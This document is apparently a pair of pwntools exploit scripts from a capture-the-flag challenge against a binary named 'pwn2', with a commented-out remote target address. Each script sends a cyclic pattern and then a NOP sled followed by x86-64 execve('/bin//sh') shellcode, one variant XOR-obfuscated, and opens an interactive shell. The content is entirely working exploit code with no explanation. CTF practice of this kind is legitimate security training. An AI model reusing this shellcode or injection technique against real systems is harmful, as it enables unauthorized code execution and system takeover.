from pwn import *
context.binary = "./pwn2"
p = process()
#p = remote("139.180.137.100", 1338)
script = """
b*getflag+24
c
"""
#p = gdb.debug("./pwn2",script)
p.send(cyclic(0x32))
p.recv()
payload = b'\x90'*50
#payload += b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
#payload += b'\x48\xBB\x3E\x73\x78\x7F\x3E\x62\x79\x00\x48\x31\xC9\x48\xB9\x11\x11\x11\x11\x11\x11\x11\x00\x48\x31\xCB\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xF6\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05'
payload += b'\x48\xBB\x3E\x3E\x73\x78\x7F\x3E\x62\x79\x48\x31\xC9\x48\xB9\x11\x11\x11\x11\x11\x11\x11\x11\x48\x31\xCB\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xF6\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05'
p.send(payload)
p.interactive()

from pwn import *
context.binary = "./pwn2"
p = process()
#p = remote("139.180.137.100", 1338)
#p = gdb.debug("./pwn2")
p.send(cyclic(0x32))
p.recv()
payload = b'\x90'*60
payload += b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
p.send(payload)
p.interactive()
